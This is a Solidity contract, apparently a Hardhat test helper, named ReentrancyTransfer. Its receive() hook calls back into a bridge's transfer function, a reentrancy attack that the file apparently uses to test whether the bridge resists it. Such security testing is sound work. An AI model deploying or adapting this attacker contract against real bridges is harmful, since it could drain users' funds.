// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "hardhat/console.sol";

interface IBridge {
  function transfer(bytes32[] memory _txHashes) external payable;
}

contract ReentrancyTransfer {
  IBridge public bridge;
  bytes32[] public hashes;

  constructor(address _bridge) payable {
    bridge = IBridge(_bridge);
  }

  function setHashToTransfer(bytes32 _hash) external {
    hashes.push(_hash);
  }

  receive() external payable {
    this.attackTransfer();
  }

  function attackTransfer() external payable {
    try bridge.transfer(hashes) {}
    catch {
      console.log('catched');
    }
  }
}
